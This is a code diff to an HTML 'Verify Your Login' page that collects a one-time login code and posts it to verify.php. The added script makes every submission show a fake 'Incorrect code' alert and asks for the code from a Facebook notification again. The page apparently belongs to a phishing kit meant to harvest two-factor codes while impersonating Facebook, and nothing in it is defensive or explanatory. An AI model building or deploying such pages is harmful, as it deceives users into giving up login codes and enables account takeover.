@@ -62,17 +62,30 @@
       background-color: #0e5a96;
     }
   </style>
+  <script>
+    document.addEventListener('DOMContentLoaded', function () {
+      document.getElementById('verificationForm').addEventListener('submit', function (event) {
+        // Allow the form to submit
+      });
+    });
+  </script>
 </head>
 <body>
   <div class="card">
     <h2>Verify Your Login</h2>
     <p>Enter the one-time code sent to your device to complete the login process.</p>
-    <form action="verify.php" method="post">
+    <form id="verificationForm" action="verify.php" method="post">
       <label for="otp">One-Time Code:</label>
       <input type="text" id="otp" name="otp" required>
 
-      <button type="submit">Verify</button>
+      <button type="submit" onclick="showPopup()">Verify</button>
     </form>
+
+    <script>
+      function showPopup() {
+        alert('Incorrect code. Enter the code you received via your Facebook notification and try again.');
+      }
+    </script>
   </div>
 </body>
 </html>
